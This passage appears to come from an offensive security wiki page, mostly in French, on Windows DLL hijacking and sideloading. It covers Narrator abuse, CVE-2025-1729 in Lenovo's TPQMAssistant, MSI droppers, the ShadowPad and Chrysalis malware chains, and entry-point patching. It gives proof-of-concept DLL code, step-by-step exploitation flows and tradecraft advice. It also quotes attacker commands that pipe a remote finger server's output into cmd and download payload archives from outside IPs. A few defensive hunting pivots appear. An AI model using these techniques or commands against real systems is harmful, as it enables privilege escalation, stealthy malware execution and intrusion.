- Connectez-vous en RDP à l’hôte, puis sur l’écran de connexion appuyez sur CTRL+WIN+ENTER pour lancer Narrator ; votre DLL s’exécute en tant que SYSTEM sur le secure desktop.
- L’exécution s’arrête quand la session RDP se ferme — injectez/migrez rapidement.

Bring Your Own Accessibility (BYOA)
- Vous pouvez cloner une entrée de registre d’un Accessibility Tool (AT) intégré (par ex. CursorIndicator), la modifier pour pointer vers un binaire/DLL arbitraire, l’importer, puis définir `configuration` sur le nom de cet AT. Cela proxie l’exécution arbitraire via le framework Accessibility.

Notes
- Écrire sous `%windir%\System32` et modifier les valeurs HKLM nécessite des droits admin.
- Toute la logique du payload peut vivre dans `DLL_PROCESS_ATTACH` ; aucun export n’est nécessaire.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### Vulnerability Details

- **Component** : `TPQMAssistant.exe` situé dans `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task** : `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` s’exécute quotidiennement à 9:30 AM sous le contexte de l’utilisateur connecté.
- **Directory Permissions** : accessible en écriture par `CREATOR OWNER`, permettant aux utilisateurs locaux de déposer des fichiers arbitraires.
- **DLL Search Behavior** : tente de charger `hostfxr.dll` depuis son répertoire de travail en premier et journalise "NAME NOT FOUND" si elle est absente, indiquant la priorité de recherche du répertoire local.

### Exploit Implementation

Un attaquant peut placer un stub malveillant `hostfxr.dll` dans le même répertoire, exploitant la DLL manquante pour obtenir l’exécution de code sous le contexte de l’utilisateur :
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. En tant qu'utilisateur standard, déposez `hostfxr.dll` dans `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Attendez que la tâche planifiée s'exécute à 9:30 AM sous le contexte de l'utilisateur actuel.
3. Si un administrateur est connecté lorsque la tâche s'exécute, la DLL malveillante s'exécute dans la session de l'administrateur avec une intégrité medium.
4. Enchaînez des techniques standard de contournement de UAC pour passer d'une intégrité medium à des privilèges SYSTEM.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Les threat actors associent fréquemment des droppers basés sur MSI avec du DLL side-loading pour exécuter des payloads sous un processus signé et de confiance.

Aperçu de la chaîne
- L'utilisateur télécharge un MSI. Une CustomAction s'exécute silencieusement pendant l'installation GUI (par ex. LaunchApplication ou une action VBScript), en reconstruisant l'étape suivante à partir de ressources intégrées.
- Le dropper écrit un EXE légitime, signé, et une DLL malveillante dans le même répertoire (paire d'exemple : wsc_proxy.exe signé par Avast + wsc.dll contrôlée par l'attaquant).
- Lorsque l'EXE signé est lancé, l'ordre de recherche des DLL de Windows charge d'abord wsc.dll depuis le répertoire de travail, exécutant le code de l'attaquant sous un parent signé (ATT&CK T1574.001).

Analyse MSI (quoi chercher)
- Table CustomAction :
- Recherchez les entrées qui lancent des exécutables ou du VBScript. Exemple de motif suspect : LaunchApplication exécutant un fichier intégré en arrière-plan.
- Dans Orca (Microsoft Orca.exe), inspectez les tables CustomAction, InstallExecuteSequence et Binary.
- Payloads intégrés/scindés dans le CAB du MSI :
- Extraction administrative : msiexec /a package.msi /qb TARGETDIR=C:\out
- Ou utilisez lessmsi : lessmsi x package.msi C:\out
- Recherchez plusieurs petits fragments qui sont concaténés et déchiffrés par une CustomAction VBScript. Flux courant :
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- Déposez ces deux fichiers dans le même dossier :
- wsc_proxy.exe : host signé légitime (Avast). Le processus tente de charger wsc.dll par son nom depuis son répertoire.
- wsc.dll : DLL de l'attaquant. Si aucun export spécifique n'est requis, DllMain peut suffire ; sinon, construisez un proxy DLL et transférez les exports requis vers la bibliothèque légitime tout en exécutant le payload dans DllMain.
- Build a minimal DLL payload :
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Pour les exigences d’export, utilisez un proxying framework (par ex. DLLirant/Spartacus) pour générer une forwarding DLL qui exécute aussi votre payload.

- Cette technique repose sur la résolution du nom de la DLL par le host binary. Si le host utilise des chemins absolus ou des safe loading flags (par ex. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), le hijack peut échouer.
- KnownDLLs, SxS, et les forwarded exports peuvent influencer la priorité et doivent être pris en compte lors du choix du host binary et du set d’exports.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point a décrit comment Ink Dragon déploie ShadowPad en utilisant une **triade de trois fichiers** pour se fondre dans un logiciel légitime tout en gardant le core payload chiffré sur le disque :

1. **Signed host EXE** – des vendors comme AMD, Realtek, ou NVIDIA sont abusés (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Les attaquants renomment l’exécutable pour qu’il ressemble à un Windows binary (par exemple `conhost.exe`), mais la signature Authenticode reste valide.
2. **Malicious loader DLL** – déposée à côté du EXE avec un nom attendu (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). La DLL est généralement un binary MFC obfusqué avec le framework ScatterBrain ; son seul rôle est de localiser le blob chiffré, le déchiffrer, et mapper ShadowPad de manière reflective.
3. **Encrypted payload blob** – souvent stocké comme `<name>.tmp` dans le même répertoire. Après le memory-mapping du payload déchiffré, le loader supprime le fichier TMP pour détruire les traces forensic.

Notes de tradecraft :

* Renommer le EXE signé (tout en gardant `OriginalFileName` d’origine dans l’en-tête PE) lui permet de se faire passer pour un Windows binary tout en conservant la signature du vendor, donc reproduisez l’habitude d’Ink Dragon de déposer des binaries ressemblant à `conhost.exe` mais qui sont en réalité des utilitaires AMD/NVIDIA.
* Comme l’exécutable reste trusted, la plupart des contrôles d’allowlisting n’ont besoin que de votre DLL malveillante placée à côté. Concentrez-vous sur la personnalisation de la loader DLL ; le parent signé peut généralement s’exécuter sans modification.
* Le decryptor de ShadowPad attend que le blob TMP se trouve à côté du loader et qu’il soit writable pour pouvoir mettre le fichier à zéro après le mapping. Gardez le répertoire writable jusqu’au chargement du payload ; une fois en mémoire, le fichier TMP peut être supprimé sans risque pour l’OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Les opérateurs associent le DLL sideloading à LOLBAS afin que le seul artefact custom sur le disque soit la DLL malveillante à côté du EXE trusted :

- **Remote command loader (Finger) :** Un PowerShell caché lance `cmd.exe /c`, récupère des commandes depuis un Finger server, puis les envoie à `cmd` :

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` récupère du texte TCP/79 ; `| cmd` exécute la réponse du serveur, ce qui permet aux opérateurs de faire tourner le second stage côté serveur.

- **Built-in download/extract :** Téléchargez une archive avec une extension bénigne, décompressez-la, puis préparez la cible du sideload ainsi que la DLL dans un dossier aléatoire sous `%LocalAppData%` :

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` masque la progression et suit les redirections ; `tar -xf` utilise le tar intégré à Windows.

- **WMI/CIM launch :** Démarrez le EXE via WMI pour que la télémétrie montre un processus créé via CIM pendant qu’il charge la DLL placée à côté :

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Fonctionne avec des binaries qui préfèrent les DLL locales (par ex. `intelbq.exe`, `nearby_share.exe`) ; le payload (par ex. Remcos) s’exécute sous le nom trusted.

- **Hunting :** Déclenchez une alerte sur `forfiles` quand `/p`, `/m`, et `/c` apparaissent ensemble ; c’est rare en dehors des scripts d’administration.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Une intrusion récente de Lotus Blossom a abusé d’une chaîne de mise à jour trusted pour livrer un dropper packé en NSIS qui a préparé un DLL sideload ainsi que des payloads entièrement en mémoire.

Tradecraft flow
- `update.exe` (NSIS) crée `%AppData%\Bluetooth`, le marque **HIDDEN**, dépose un Bitdefender Submission Wizard `BluetoothService.exe` renommé, une `log.dll` malveillante, et un blob chiffré `BluetoothService`, puis lance le EXE.
- Le host EXE importe `log.dll` et appelle `LogInit`/`LogWrite`. `LogInit` charge le blob via mmap ; `LogWrite` le déchiffre avec un flux custom basé sur LCG (constantes **0x19660D** / **0x3C6EF35F**, key material dérivé d’un hash précédent), écrase le buffer avec du shellcode en clair, libère les temporaires, puis saute dessus.
- Pour éviter une IAT, le loader résout les APIs en hashant les noms d’export avec **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, puis en appliquant un avalanche de style Murmur (**0x85EBCA6B**) et en comparant aux hash cibles salés.

Main shellcode (Chrysalis)
- Déchiffre un main module de type PE en répétant add/XOR/sub avec la clé `gQ2JR&9;` sur cinq passes, puis charge dynamiquement `Kernel32.dll` → `GetProcAddress` pour terminer la résolution des imports.
- Reconstruit les chaînes de noms de DLL au runtime via des transformations bit-rotate/XOR par caractère, puis charge `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Utilise un second resolver qui parcourt le **PEB → InMemoryOrderModuleList**, analyse chaque export table par blocs de 4 octets avec un mélange de style Murmur, et ne retombe sur `GetProcAddress` que si le hash n’est pas trouvé.

Embedded configuration & C2
- La config se trouve dans le fichier `BluetoothService` déposé à l’**offset 0x30808** (taille **0x980**) et est déchiffrée en RC4 avec la clé `qwhvb^435h&*7`, révélant l’URL C2 et le User-Agent.
- Les beacons construisent un profil hôte délimité par des points, préfixent le tag `4Q`, puis chiffrent en RC4 avec la clé `vAuig34%^325hGV` avant `HttpSendRequestA` via HTTPS. Les réponses sont déchiffrées en RC4 et dispatchées par un tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + cas de chunked transfer).
- Le mode d’exécution est contrôlé par les arguments CLI : sans args = installation de la persistence (service/Run key) pointant vers `-i` ; `-i` relance le programme avec `-k` ; `-k` saute l’installation et exécute le payload.

Alternate loader observed
- La même intrusion a déposé Tiny C Compiler et exécuté `svchost.exe -nostdlib -run conf.c` depuis `C:\ProgramData\USOShared\`, avec `libtcc.dll` à côté. Le code source C fourni par l’attaquant embarquait du shellcode, le compilait, et l’exécutait en mémoire sans toucher le disque avec un PE. Reproduisez avec :
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Cette étape de compile-and-run basée sur TCC a importé `Wininet.dll` au runtime et a récupéré un second stage shellcode depuis une URL en dur, offrant un loader flexible qui se faisait passer pour une exécution de compiler.

## Signed-host sideloading avec export proxying + host thread parking

Certaines chaînes de DLL sideloading ajoutent de l’**ingénierie de stabilité** afin que l’hôte légitime reste actif assez longtemps pour charger proprement les étapes suivantes au lieu de crasher après le chargement de la DLL malveillante.

Schéma observé
- Déposer un EXE de confiance à côté d’une DLL malveillante en utilisant le nom de dépendance attendu, comme `version.dll`.
- La DLL malveillante **proxyfie tous les exports attendus** vers la vraie DLL système (par exemple `%SystemRoot%\\System32\\version.dll`) afin que la résolution des imports réussisse toujours et que le processus hôte continue de fonctionner.
- Après le chargement, la DLL malveillante **patch l’entry point de l’hôte** pour que le thread principal tombe dans une boucle `Sleep` infinie au lieu de sortir ou d’exécuter des chemins de code qui termineraient le processus.
- Un nouveau thread effectue le vrai travail malveillant : déchiffrer le nom ou le chemin de la DLL du stage suivant (RC4/XOR sont courants), puis la lancer avec `LoadLibrary`.

Pourquoi c’est important
- Le proxying DLL normal préserve la compatibilité API, mais ne garantit pas que l’hôte reste vivant assez longtemps pour les étapes suivantes.
- Mettre le thread principal en `Sleep(INFINITE)` est une manière simple de maintenir le processus signé en mémoire pendant que le loader effectue le déchiffrement, le staging ou l’initialisation réseau dans un worker thread.
- Chercher seulement un `DllMain` suspect peut manquer ce schéma si le comportement intéressant se produit après le patch de l’entry point de l’hôte et le démarrage d’un thread secondaire.

Workflow minimal
1. Copier l’EXE hôte signé et déterminer la DLL qu’il résout depuis le répertoire local.
2. Construire une DLL proxy exportant les mêmes fonctions et les transférant vers la DLL légitime.
3. Dans `DllMain(DLL_PROCESS_ATTACH)`, créer un worker thread.
4. Depuis ce thread, patcher l’entry point de l’hôte ou la routine de démarrage du thread principal pour qu’elle boucle sur `Sleep`.
5. Déchiffrer le nom/config de la DLL du stage suivant et appeler `LoadLibrary` ou faire un manual-map du payload.

Pivots défensifs
- Des processus signés chargeant `version.dll` ou des bibliothèques similaires courantes depuis leur propre répertoire d’application au lieu de `System32`.
- Des patches mémoire à l’entry point du processus peu après le chargement de l’image, en particulier des sauts/appels redirigés vers `Sleep`/`SleepEx`.
- Des threads créés par une DLL proxy qui appellent immédiatement `LoadLibrary` sur une deuxième DLL avec un nom déchiffré.
- Des DLL proxy full-export placées à côté d’exécutables de l’éditeur dans des répertoires de staging inscriptibles comme `ProgramData`, `%TEMP%`, ou des chemins d’archives décompressées.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Unit 42 – Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [Unit 42 – CL-STA-1062 Targets Southeast Asian Governments and Critical Infrastructure](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)


{{#include ../../../banners/hacktricks-training.md}}
